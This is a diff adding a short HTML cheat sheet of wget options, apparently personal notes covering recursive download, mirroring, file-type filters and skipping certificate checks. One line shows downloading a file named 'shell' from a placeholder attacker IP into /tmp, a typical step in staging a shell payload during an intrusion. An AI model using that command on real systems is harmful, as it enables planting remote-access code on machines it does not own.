@@ -1,0 +1,18 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>wget</title>
+</head><body>--no-check-certificate				having trouble with https, force it to ignore with not checking certificate argument<br/>
+-O								force to write to a directory, usually need to know full name of file and where getting from<br/>
+ -O /tmp/shell http://&lt;ip&gt;/shell<br/>
+<br/>
+wget -r -np -k http://www.ime.usp.br/~coelho/mac0122-2013/ep2/esqueleto/<br/>
+Other useful options:<br/>
+-r: recursive<br/>
+-np: don't folow links to parent directories<br/>
+-k: make links in downloaded HTML or CSS point to local files<br/>
+-nd (no directories): download all files to the current directory<br/>
+-e robots.off: ignore robots.txt files, don't download robots.txt files<br/>
+-A png,jpg: accept only files with the extensions png or jpg<br/>
+-m (mirror): -r --timestamping --level inf --no-remove-listing (functions suitable for mirroring site)<br/>
+-nc, --no-clobber: Skip download if files exist</body></html>
